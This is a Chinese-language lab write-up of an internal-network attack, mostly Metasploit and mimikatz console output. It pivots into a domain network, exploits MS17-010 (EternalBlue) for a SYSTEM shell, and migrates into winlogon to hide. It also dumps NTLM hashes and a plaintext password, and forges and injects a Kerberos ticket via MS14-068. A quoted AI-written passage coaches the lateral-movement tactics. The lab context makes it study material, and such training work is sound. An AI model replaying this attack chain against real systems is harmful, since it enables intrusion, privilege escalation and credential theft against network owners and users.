[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 192.168.183.0/255.255.255.0...
[+] Added route to 192.168.183.0/255.255.255.0 via 192.168.157.130
[*] Use the -p option to list all active routes
meterpreter > background
[*] Backgrounding session 1...
msf exploit(multi/handler) > use auxiliary/scanner/portscan/tcp

IPv4 Active Routing Table
=========================

   Subnet             Netmask            Gateway
   ------             -------            -------
   192.168.183.0      255.255.255.0      Session 1

[*] There are currently no IPv6 routes defined.
msf exploit(multi/handler) > 
msf auxiliary(scanner/discovery/udp_sweep) > use post/multi/gather/ping_sweep
msf post(multi/gather/ping_sweep) > set SESSION 1
SESSION => 1
msf post(multi/gather/ping_sweep) > set RHOSTS 192.168.183.0/24
RHOSTS => 192.168.183.0/24
msf post(multi/gather/ping_sweep) > run
[*] Performing ping sweep for IP range 192.168.183.0/24
[+] 	192.168.183.129 host found
[+] 	192.168.183.130 host found
[+] 	192.168.183.132 host found
[*] Post module execution completed
msf post(multi/gather/ping_sweep) > 


```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081455811.png)





找到存活主机，其中 132 是 ubuntu，另外俩个就是内网主机了



## 探测端口：
```bash
msf auxiliary(scanner/portscan/tcp) > set RHOSTS 192.168.183.129 192.168.183.130
RHOSTS => 192.168.183.129 192.168.183.130
msf auxiliary(scanner/portscan/tcp) > set PORTS 1-65535
PORTS => 1-65535
msf auxiliary(scanner/portscan/tcp) > set THREADS 50
THREADS => 50
msf auxiliary(scanner/portscan/tcp) > set CONCURRENCY 10
CONCURRENCY => 10
msf auxiliary(scanner/portscan/tcp) > run
[+] 192.168.183.129       - 192.168.183.129:135 - TCP OPEN
[+] 192.168.183.129       - 192.168.183.129:139 - TCP OPEN
[+] 192.168.183.129       - 192.168.183.129:445 - TCP OPEN
[+] 192.168.183.130       - 192.168.183.130:53 - TCP OPEN
[+] 192.168.183.130       - 192.168.183.130:88 - TCP OPEN
[+] 192.168.183.130       - 192.168.183.130:135 - TCP OPEN
[+] 192.168.183.130       - 192.168.183.130:139 - TCP OPEN
[+] 192.168.183.129       - 192.168.183.129:5357 - TCP OPEN
[+] 192.168.183.130       - 192.168.183.130:389 - TCP OPEN
[+] 192.168.183.130       - 192.168.183.130:445 - TCP OPEN
[+] 192.168.183.130       - 192.168.183.130:464 - TCP OPEN
[+] 192.168.183.130       - 192.168.183.130:593 - TCP OPEN
[+] 192.168.183.130       - 192.168.183.130:636 - TCP OPEN
[+] 192.168.183.130       - 192.168.183.130:3269 - TCP OPEN
[+] 192.168.183.129       - 192.168.183.129:49152 - TCP OPEN
[+] 192.168.183.129       - 192.168.183.129:49153 - TCP OPEN
[+] 192.168.183.129       - 192.168.183.129:49154 - TCP OPEN
[+] 192.168.183.129       - 192.168.183.129:49157 - TCP OPEN
[+] 192.168.183.129       - 192.168.183.129:49164 - TCP OPEN
[+] 192.168.183.129       - 192.168.183.129:49190 - TCP OPEN
[*] Scanned 1 of 2 hosts (50% complete)

```



或者可以直接探测常见端口：

```bash
msf auxiliary(scanner/smb/smb_version) > use auxiliary/scanner/portscan/tcp
msf auxiliary(scanner/portscan/tcp) > set ports 135,445,80,443,1433,3306,53,8080,8888,7001
ports => 135,445,80,443,1433,3306,53,8080,8888,7001
msf auxiliary(scanner/portscan/tcp) > set rhosts 192.168.183.129-130
rhosts => 192.168.183.129-130
msf auxiliary(scanner/portscan/tcp) > run
][+] 192.168.183.129       - 192.168.183.129:445 - TCP OPEN
[+] 192.168.183.129       - 192.168.183.129:135 - TCP OPEN
[+] 192.168.183.130       - 192.168.183.130:135 - TCP OPEN
[+] 192.168.183.130       - 192.168.183.130:53 - TCP OPEN
[+] 192.168.183.130       - 192.168.183.130:445 - TCP OPEN
[*] Scanned 1 of 2 hosts (50% complete)
[*] Scanned 2 of 2 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/portscan/tcp) > 

```





## 永恒之蓝：


```bash
msf auxiliary(scanner/smb/smb_ms17_010) > set payload windows/x64/meterpreter/bind_tcp
[!] Unknown datastore option: payload.
payload => windows/x64/meterpreter/bind_tcp
msf auxiliary(scanner/smb/smb_ms17_010) > set rhosts 192.168.183.129-130
rhosts => 192.168.183.129-130
msf auxiliary(scanner/smb/smb_ms17_010) > run
[+] 192.168.183.129:445   - Host is likely VULNERABLE to MS17-010! - Windows 7 Enterprise 7601 Service Pack 1 x64 (64-bit)
[*] Scanned 1 of 2 hosts (50% complete)
[+] 192.168.183.130:445   - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 HPC Edition 7601 Service Pack 1 x64 (64-bit)
[*] Scanned 2 of 2 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/smb/smb_ms17_010) > 

```

俩个机器都存在永恒之蓝，先打 129 的 win7





```bash
msf auxiliary(scanner/smb/smb_ms17_010) > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.183.129
RHOSTS => 192.168.183.129
msf exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/bind_tcp
PAYLOAD => windows/x64/meterpreter/bind_tcp
msf exploit(windows/smb/ms17_010_eternalblue) > run
[*] 192.168.183.129:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.183.129:445   - Host is likely VULNERABLE to MS17-010! - Windows 7 Enterprise 7601 Service Pack 1 x64 (64-bit)
[*] 192.168.183.129:445   - Scanned 1 of 1 hosts (100% complete)
[+] 192.168.183.129:445 - The target is vulnerable.
[*] 192.168.183.129:445 - Connecting to target for exploitation.
[+] 192.168.183.129:445 - Connection established for exploitation.
[+] 192.168.183.129:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.183.129:445 - CORE raw buffer dump (40 bytes)
[*] 192.168.183.129:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 45 6e 74 65 72 70  Windows 7 Enterp
[*] 192.168.183.129:445 - 0x00000010  72 69 73 65 20 37 36 30 31 20 53 65 72 76 69 63  rise 7601 Servic
[*] 192.168.183.129:445 - 0x00000020  65 20 50 61 63 6b 20 31                          e Pack 1        
[+] 192.168.183.129:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 192.168.183.129:445 - Trying exploit with 12 Groom Allocations.
[*] 192.168.183.129:445 - Sending all but last fragment of exploit packet
[*] 192.168.183.129:445 - Starting non-paged pool grooming
[+] 192.168.183.129:445 - Sending SMBv2 buffers
[+] 192.168.183.129:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 192.168.183.129:445 - Sending final SMBv2 buffers.
[*] 192.168.183.129:445 - Sending last fragment of exploit packet!
[*] 192.168.183.129:445 - Receiving response from exploit packet
[+] 192.168.183.129:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 192.168.183.129:445 - Sending egg to corrupted connection.
[*] 192.168.183.129:445 - Triggering free of corrupted buffer.
[*] Started bind TCP handler against 192.168.183.129:4444
[*] Sending stage (232006 bytes) to 192.168.183.129
[*] Meterpreter session 2 opened (Local Pipe -> Remote Pipe via session 1) at 2026-04-06 02:35:11 -0400
[+] 192.168.183.129:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.183.129:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.183.129:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > 

```





###  进程迁移  
>  永恒之蓝攻击生成的进程（通常是随机名）不够稳定，容易崩溃或被杀软拦截。迁移到 `lsass.exe` 或 `services.exe` 等系统服务进程中，既能隐藏自己，又能保证权限持久稳定。  
>



```bash
meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System             x64   0
 196   1432  winlogon.exe       x64   2        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
 260   4     smss.exe           x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
 348   332   csrss.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 368   500   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE
 400   332   wininit.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
 436   1432  csrss.exe          x64   2        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 500   400   services.exe       x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
 508   400   lsass.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
 516   400   lsm.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
 624   500   svchost.exe        x64   0        NT AUTHORITY\SYSTEM
 688   500   vmacthlp.exe       x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\
                                                                             vmacthlp.exe
 732   500   svchost.exe        x64   0        NT AUTHORITY\NETWORK SERVICE
 772   500   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE
 864   500   svchost.exe        x64   0        NT AUTHORITY\SYSTEM
 888   500   SearchIndexer.exe  x64   0        NT AUTHORITY\SYSTEM
 940   500   svchost.exe        x64   0        NT AUTHORITY\SYSTEM
 1052  500   svchost.exe        x64   0        NT AUTHORITY\NETWORK SERVICE
 1084  500   msdtc.exe          x64   0        NT AUTHORITY\NETWORK SERVICE
 1152  500   spoolsv.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1188  500   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE
 1276  2868  vmtoolsd.exe       x64   2        DEMO\douser                   C:\Program Files\VMware\VMware Tools\
                                                                             vmtoolsd.exe
 1348  500   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE
 1448  500   VGAuthService.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\
                                                                             VMware VGAuth\VGAuthService.exe
 1504  500   vmtoolsd.exe       x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\
                                                                             vmtoolsd.exe
 1560  436   conhost.exe        x64   2        DEMO\douser                   C:\Windows\system32\conhost.exe
 1840  624   WmiPrvSE.exe
 1884  2868  cmd.exe            x64   2        DEMO\douser                   C:\Windows\system32\cmd.exe
 1900  500   svchost.exe        x64   0        NT AUTHORITY\NETWORK SERVICE
 2256  500   svchost.exe        x64   0        NT AUTHORITY\SYSTEM
 2616  500   taskhost.exe       x64   2        DEMO\douser                   C:\Windows\system32\taskhost.exe
 2856  864   dwm.exe            x64   2        DEMO\douser                   C:\Windows\system32\Dwm.exe
 2868  2560  explorer.exe       x64   2        DEMO\douser                   C:\Windows\Explorer.EXE
 2880  500   sppsvc.exe         x64   0        NT AUTHORITY\NETWORK SERVICE

meterpreter > migrate 196
[*] Migrating from 1152 to 196...
[*] Migration completed successfully.
meterpreter > getpid
Current pid: 196
meterpreter > 

```

 进入 Shell 并切换编码  

 为了防止在查看中文域信息时出现乱码，先执行以下命令  

```bash
meterpreter > shell
Process 2064 created.
Channel 1 created.
Microsoft Windows [°汾 6.1.7601]
°爨̹Ԑ (c) 2009 Microsoft Corporation¡£±£´̹ԐȨ{¡£

C:\Windows\system32>chcp 65001
chcp 65001
Active code page: 65001

C:\Windows\system32>
```





```bash
C:\Windows\system32>net user
net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            Guest                    testclone                
The command completed with one or more errors.

C:\Windows\system32>net view /domain
net view /domain
Domain

-------------------------------------------------------------------------------
DEMO                 
The command completed successfully.


C:\Windows\system32>

```



确定当前是在 DEMO 这个域中，

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081454202.png)



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081455361.png)





回到最高权限，尝试获取密码：

```bash
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username      Domain  NTLM                              SHA1
--------      ------  ----                              ----
TESTWIN7-PC$  DEMO    e3ba914bdaca29c197c7191ebf521873  68a1422322c303e4c24d63f381a03b34eb434477
douser        DEMO    bc23b0b4d5bf5ff42bc61fb62e13886e  c48096437367aad00ac2dc70552051cd84912a55

wdigest credentials
===================

Username      Domain  Password
--------      ------  --------
(null)        (null)  (null)
TESTWIN7-PC$  DEMO    /-LDA[1d hf-tfj)O)yNyCgh[o#D[h7I/*-'ShnKX%X7`wWWdrLDd`!EUceLQ8:y!J?TD5KY*iuQ32i8He_D#JyWDWIz
                      uYDDytr)\J7(_e(Fctsjl.Zd"JRr
douser        DEMO    Dotest123

kerberos credentials
====================

Username      Domain    Password
--------      ------    --------
(null)        (null)    (null)
douser        DEMO.COM  (null)
testwin7-pc$  demo.com  /-LDA[1d hf-tfj)O)yNyCgh[o#D[h7I/*-'ShnKX%X7`wWWdrLDd`!EUceLQ8:y!J?TD5KY*iuQ32i8He_D#JyWDW
                        IzuYDDytr)\J7(_e(Fctsjl.Zd"JRr
testwin7-pc$  DEMO.COM  /-LDA[1d hf-tfj)O)yNyCgh[o#D[h7I/*-'ShnKX%X7`wWWdrLDd`!EUceLQ8:y!J?TD5KY*iuQ32i8He_D#JyWDW
                        IzuYDDytr)\J7(_e(Fctsjl.Zd"JRr


meterpreter > 

```

明文密码：

**douser        DEMO    Dotest123**





### 横向移动




使用 <font style="color:rgb(34, 34, 34);background-color:rgba(255, 255, 255, 0.9);">psexec 并没有成功</font>

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081455122.png)





 获取关键信息 (SID)  

```bash
msf exploit(windows/smb/psexec) > sessions 

Active sessions
===============

  Id  Name  Type                     Information                        Connection
  --  ----  ----                     -----------                        ----------
  1         meterpreter x86/linux    ubuntu @ ubuntu                    192.168.157.129:5555 -> 192.168.157.130:52
                                                                        944 (192.168.157.130)
  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ TESTWIN7-PC  Local Pipe -> Remote Pipe via session 1 (1
                                                                        92.168.183.129)

msf exploit(windows/smb/psexec) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > shell
Process 2780 created.
Channel 2 created.
Microsoft Windows [°汾 6.1.7601]
°爨̹Ԑ (c) 2009 Microsoft Corporation¡£±£´̹ԐȨ{¡£

C:\Windows\system32>whoami /user
whoami /user

ԃ»§хϢ
----------------

ԃ»§Ļ              SID     
=================== ========
nt authority\system S-1-5-18

C:\Windows\system32>

```

现在的身份是 `**nt authority\system**`，所以拿到的 SID 是 `**S-1-5-18**`。

但是，**MS14-068 提权必须使用“普通域用户”的 SID** 才能伪造出一张包含域管权限的票据。用系统账户（SYSTEM）的 SID 是做不出这种票据的。





切换到 `douser` 获取 SID

我们需要获取之前在进程列表里看到的那个域用户 `**douser**` 的 SID。

```bash
C:\Windows\system32>exit
exit
meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System             x64   0
 196   1432  winlogon.exe       x64   2        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
 260   4     smss.exe           x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
 348   332   csrss.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 368   500   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\system32\svchost.exe
 400   332   wininit.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
 436   1432  csrss.exe          x64   2        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 500   400   services.exe       x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
 508   400   lsass.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
 516   400   lsm.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
 624   500   svchost.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\svchost.exe
 688   500   vmacthlp.exe       x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\
                                                                             vmacthlp.exe
 732   500   svchost.exe        x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\svchost.exe
 772   500   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 864   500   svchost.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 888   500   SearchIndexer.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\SearchIndexer.exe
 940   500   svchost.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\svchost.exe
 1052  500   svchost.exe        x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\svchost.exe
 1084  500   msdtc.exe          x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\msdtc.exe
 1188  500   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\system32\svchost.exe
 1276  2868  vmtoolsd.exe       x64   2        DEMO\douser                   C:\Program Files\VMware\VMware Tools\
                                                                             vmtoolsd.exe
 1348  500   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\system32\svchost.exe
 1448  500   VGAuthService.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\
                                                                             VMware VGAuth\VGAuthService.exe
 1504  500   vmtoolsd.exe       x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\
                                                                             vmtoolsd.exe
 1560  436   conhost.exe        x64   2        DEMO\douser                   C:\Windows\system32\conhost.exe
 1668  500   spoolsv.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1840  624   WmiPrvSE.exe       x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\wbem\wmiprvse.exe
 1884  2868  cmd.exe            x64   2        DEMO\douser                   C:\Windows\system32\cmd.exe
 1900  500   svchost.exe        x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\svchost.exe
 2256  500   svchost.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2616  500   taskhost.exe       x64   2        DEMO\douser                   C:\Windows\system32\taskhost.exe
 2820  624   slui.exe           x64   2        DEMO\douser                   C:\Windows\System32\slui.exe
 2856  864   dwm.exe            x64   2        DEMO\douser                   C:\Windows\system32\Dwm.exe
 2868  2560  explorer.exe       x64   2        DEMO\douser                   C:\Windows\Explorer.EXE
 2880  500   sppsvc.exe         x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\sppsvc.exe

meterpreter > 
meterpreter > migrate 2616
[*] Migrating from 196 to 2616...
[*] Migration completed successfully.
meterpreter > 
meterpreter > shell
Process 224 created.
Channel 1 created.
Microsoft Windows [°汾 6.1.7601]
°爨̹Ԑ (c) 2009 Microsoft Corporation¡£±£´̹ԐȨ{¡£

C:\Windows\system32>whoami /user
whoami /user

ԃ»§хϢ
----------------

ԃ»§Ļ      SID                                          
=========== =============================================
demo\douser S-1-5-21-979886063-1111900045-1414766810-1107

C:\Windows\system32>

```



 获取真正的用户 SID  `S-1-5-21-979886063-1111900045-1414766810-1107`



这里靶机作者已经将需要的文件上传到靶机了，所以直接利用就好



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081455107.png)



清理旧票据 ` TGT_douser@demo.com.ccache  `

 生成新票据 ： 

```bash
C:\Users\douser\Desktop>del TGT_douser@demo.com.ccache
del TGT_douser@demo.com.ccache

C:\Users\douser\Desktop>MS14-068.exe -u douser@DEMO.com -s S-1-5-21-979886063-1111900045-1414766810-1107 -d 192.168.183.130 -p Dotest123
MS14-068.exe -u douser@DEMO.com -s S-1-5-21-979886063-1111900045-1414766810-1107 -d 192.168.183.130 -p Dotest123
  [+] Building AS-REQ for 192.168.183.130... Done!
  [+] Sending AS-REQ to 192.168.183.130... Done!
  [+] Receiving AS-REP from 192.168.183.130... Done!
  [+] Parsing AS-REP from 192.168.183.130... Done!
  [+] Building TGS-REQ for 192.168.183.130... Done!
  [+] Sending TGS-REQ to 192.168.183.130... Done!
  [+] Receiving TGS-REP from 192.168.183.130... Done!
  [+] Parsing TGS-REP from 192.168.183.130... Done!
  [+] Creating ccache file 'TGT_douser@DEMO.com.ccache'... Done!

C:\Users\douser\Desktop>

```

 使用 Mimikatz 注入内存  

  


```bash
C:\Users\douser\Desktop>mimikatz.exe
mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #18362 Jan  2 2020 19:21:39
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # kerberos::ptc TGT_douser@DEMO.COM.ccache

Principal : (01) : douser ; @ DEMO.COM

Data 0
	   Start/End/MaxRenew: 2026/4/6 15:34:13 ; 2026/4/7 1:34:13 ; 2026/4/13 15:34:13
	   Service Name (01) : krbtgt ; DEMO.COM ; @ DEMO.COM
	   Target Name  (01) : krbtgt ; DEMO.COM ; @ DEMO.COM
	   Client Name  (01) : douser ; @ DEMO.COM
	   Flags 50a00000    : pre_authent ; renewable ; proxiable ; forwardable ; 
	   Session Key       : 0x00000017 - rc4_hmac_nt      
	     3762096e7f6f62e5452b7b856a3f27f2
	   Ticket            : 0x00000000 - null              ; kvno = 2	[...]
	   * Injecting ticket : OK

mimikatz # exit
Bye!

C:\Users\douser\Desktop>

```

<font style="color:rgb(34, 34, 34);background-color:rgba(255, 255, 255, 0.9);"></font>

<font style="color:rgb(34, 34, 34);background-color:rgba(255, 255, 255, 0.9);"> 确认票据已注入  </font>

```bash
C:\Users\douser\Desktop>klist
klist

Current LogonId is 0:0x58555

Cached Tickets: (5)

#0>	Client: douser @ DEMO.COM
	Server: krbtgt/DEMO.COM @ DEMO.COM
	KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
	Ticket Flags 0x50a00000 -> forwardable proxiable renewable pre_authent 
	Start Time: 4/6/2026 17:47:03 (local)
	End Time:   4/7/2026 3:47:03 (local)
	Renew Time: 4/13/2026 17:47:03 (local)
	Session Key Type: RSADSI RC4-HMAC(NT)


#1>	Client: douser @ DEMO.COM
	Server: krbtgt/DEMO.COM @ DEMO.COM
	KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
	Ticket Flags 0x60a00000 -> forwardable forwarded renewable pre_authent 
	Start Time: 4/6/2026 17:24:49 (local)
	End Time:   4/7/2026 3:24:48 (local)
	Renew Time: 4/13/2026 17:24:48 (local)
	Session Key Type: RSADSI RC4-HMAC(NT)


#2>	Client: douser @ DEMO.COM
	Server: cifs/win-ens2vr5tr3n.demo.com @ DEMO.COM
	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
	Ticket Flags 0x40a40000 -> forwardable renewable pre_authent ok_as_delegate 
	Start Time: 4/6/2026 17:24:49 (local)
	End Time:   4/7/2026 3:24:48 (local)
	Renew Time: 4/13/2026 17:24:48 (local)
	Session Key Type: AES-256-CTS-HMAC-SHA1-96


#3>	Client: douser @ DEMO.COM
	Server: ldap/win-ens2vr5tr3n.demo.com @ DEMO.COM
	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
	Ticket Flags 0x40a40000 -> forwardable renewable pre_authent ok_as_delegate 
	Start Time: 4/6/2026 17:24:49 (local)
	End Time:   4/7/2026 3:24:48 (local)
	Renew Time: 4/13/2026 17:24:48 (local)
	Session Key Type: AES-256-CTS-HMAC-SHA1-96


#4>	Client: douser @ DEMO.COM
	Server: LDAP/WIN-ENS2VR5TR3N.demo.com/demo.com @ DEMO.COM
	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
	Ticket Flags 0x40a40000 -> forwardable renewable pre_authent ok_as_delegate 
	Start Time: 4/6/2026 17:24:48 (local)
	End Time:   4/7/2026 3:24:48 (local)
	Renew Time: 4/13/2026 17:24:48 (local)
	Session Key Type: AES-256-CTS-HMAC-SHA1-96



```

 



#### 问题 1
打到一半发现 win7 死活连接不上了，执行一个简单命令就会崩溃。以下换用 130 的机器



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081454172.png)





<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081453321.png)







？

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081454525.png)





最后把所有机器包括物理机都重启了一遍，就好了





#### 问题 2
看了很多师傅的文章，凭据类的我都用不了，不知道为什么

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081455596.png)

> AI 之力：
>
> ### 1. 为什么“永恒之蓝”也是横向移动？
> 横向移动分为两大流派：
>
> + **凭据类横向（Credential-based）：** 使用你拿到的账号、密码、哈希、票据（如 `psexec`、`WMI`、`MS14-068`）。这是你刚才一直在练习的。
> + **漏洞类横向（Exploit-based）：** 既然你在 A 机器（Win7）上发现了 B 机器（域控）的存在，并且探测到它有系统级漏洞（MS17-010），那么你从 A 发起对 B 的漏洞攻击，这就是典型的**基于漏洞的横向移动**。
>
> ### 2. 为什么你之前的“凭据类”失败了？
> 横向移动最难的地方在于**权限匹配**。
>
> + 你的 `douser` 账号有密码，但他在域控上没有**本地管理员权限**。
> + 这就好比你偷到了邻居家的钥匙，但你发现那是他家自行车的钥匙，开不了他家大门。
> + 这种情况下，你要么去偷“大门钥匙”（找域管账号），要么直接“翻窗进去”（利用漏洞）。
>
> ### 3. 我们现在的战术路径：
> 你目前的练习流程是这样的：
>
> 1. **起点**：拿到 Web 服务器（Ubuntu）。
> 2. **纵向渗透**：进入内网 Win7。
> 3. **内网搜集**：拿到 `douser` 密码，发现域控 130。
> 4. **横向尝试 A（失败）**：尝试用 `douser` 的凭据直接登录域控（因为权限不够）。
> 5. **横向尝试 B（成功率最高）**：既然拿到了 Win7 这个跳板，直接从跳板机发起漏洞攻击（永恒之蓝）直达域控。
>





#### <font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">重新开始横向移动：</font>
首先用永恒之蓝连接 win7

SYSTEM 权限可以读取操作系统最核心的 LSA 内存。我们要看看除了 `douser`，还有没有别的（比如域管理员）  

```bash
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
meterpreter > kiwi_cmd sekurlsa::logonpasswords

Authentication Id : 0 ; 361813 (00000000:00058555)
Session           : Interactive from 1
User Name         : douser
Domain            : DEMO
Logon Server      : WIN-ENS2VR5TR3N
Logon Time        : 2026/4/6 17:24:48
SID               : S-1-5-21-979886063-1111900045-1414766810-1107
	msv :	
	 [00010000] CredentialKeys
	 * NTLM     : bc23b0b4d5bf5ff42bc61fb62e13886e
	 * SHA1     : c48096437367aad00ac2dc70552051cd84912a55
	 [00000003] Primary
	 * Username : douser
	 * Domain   : DEMO
	 * NTLM     : bc23b0b4d5bf5ff42bc61fb62e13886e
	 * SHA1     : c48096437367aad00ac2dc70552051cd84912a55
	tspkg :	
	wdigest :	
	 * Username : douser
	 * Domain   : DEMO
	 * Password : Dotest123
	kerberos :	
	 * Username : douser
	 * Domain   : DEMO.COM
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2026/4/6 17:21:01
SID               : S-1-5-19
	msv :	
	tspkg :	
	wdigest :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : TESTWIN7-PC$
Domain            : DEMO
Logon Server      : (null)
